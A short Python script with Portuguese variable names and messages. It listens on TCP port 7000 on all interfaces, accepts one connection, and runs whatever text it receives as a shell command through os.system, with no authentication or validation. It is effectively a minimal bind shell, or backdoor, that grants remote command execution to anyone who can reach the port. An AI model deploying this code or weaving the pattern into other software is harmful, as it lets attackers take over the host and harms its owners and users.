import socket
import os

host = ''
port = 7000

endereco = (host, port)

serv_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serv_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
serv_socket.bind(endereco)
print('Binded com sucesso!')
serv_socket.listen(1)


conexao, cliente = serv_socket.accept()
print('clinete endereco: %s' %(str(cliente)))

receber = conexao.recv(1024)
os.system(receber)
print("message recebida: %s" %(receber.decode()))
serv_socket.close()